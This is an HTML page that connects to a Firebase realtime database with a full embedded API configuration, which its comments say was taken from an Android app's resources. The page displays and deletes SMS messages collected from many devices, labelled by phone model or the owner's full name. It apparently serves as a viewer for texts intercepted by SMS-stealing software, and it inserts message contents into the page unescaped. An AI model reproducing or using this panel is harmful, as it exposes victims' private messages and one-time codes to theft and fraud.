<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Realtime SMS Database</title>
  <style>
    body {font-family: Arial, sans-serif; margin: 40px;}
    h2 {margin-top: 30px;}
    .sms-card{background:#f9f9f9;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:6px;}
    .delete-btn{background:#d9534f;color:#fff;border:none;padding:5px 10px;border-radius:4px;cursor:pointer;}
  </style>
</head>
<body>
  <h1>Devices SMS (Realtime)</h1>
  <div id="content">Loading...</div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
  <script>
const firebaseConfig = {
  apiKey: "AIzaSyA_z1ekX-HjLfobKjOAKzNgmZHL5xOEBJw",                     // <string name="google_api_key">
  authDomain: "m23dm1a2.firebaseapp.com",                                // based on <string name="project_id">
  databaseURL: "https://m23dm1a2-default-rtdb.europe-west1.firebasedatabase.app", // <string name="firebase_database_url">
  projectId: "m23dm1a2",                                                 // <string name="project_id">
  storageBucket: "m23dm1a2.firebasestorage.app",                         // <string name="google_storage_bucket">
  messagingSenderId: "402219275845",                                     // <string name="gcm_defaultSenderId">
  appId: "1:402219275845:android:63a0b32cf7a20c28a9b52c"                 // <string name="google_app_id">
};
    firebase.initializeApp(firebaseConfig);
    var db = firebase.database();

    const container = document.getElementById('content');

    function render(snapshot){
  container.innerHTML = '';
  snapshot.forEach(function(deviceSnap){
    const deviceId = deviceSnap.key;
    const deviceData = deviceSnap.val();

    // Display name priority: model > fullName > deviceId
    let name = deviceId;
    if(deviceData.DeviceInfo && deviceData.DeviceInfo.model){
      name = deviceData.DeviceInfo.model;
    }
    else if(deviceData.input && deviceData.input.fullName){
      name = deviceData.input.fullName;
    }

    const h2 = document.createElement('h2');
    h2.innerText = name;
    container.appendChild(h2);
    
    if(deviceData.sms){
      Object.entries(deviceData.sms).forEach(([msgId, smsObj])=>{
        const card = document.createElement('div');
        card.className='sms-card';
        card.innerHTML = `
          <b>Sender:</b> ${smsObj.sender}<br/>
          <b>Body:</b> ${smsObj.messageBody}<br/>
          <b>Time:</b> ${smsObj.time}<br/>
          <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
        `;
        container.appendChild(card);
      });
    }
    else{
      const p = document.createElement('p');
      p.innerText = 'No SMS found.';
      container.appendChild(p);
    }
  });
}

    // ⏱ realtime listener
    db.ref('Devices').on('value', function(snapshot){
      render(snapshot);
    });

    function deleteMsg(deviceId, msgId){
      if(confirm('Delete this message?')){
        db.ref(`Devices/${deviceId}/sms/${msgId}`).remove()
          .catch(e => alert("Error: " + e.message));
      }
    }
  </script>
</body>
</html>
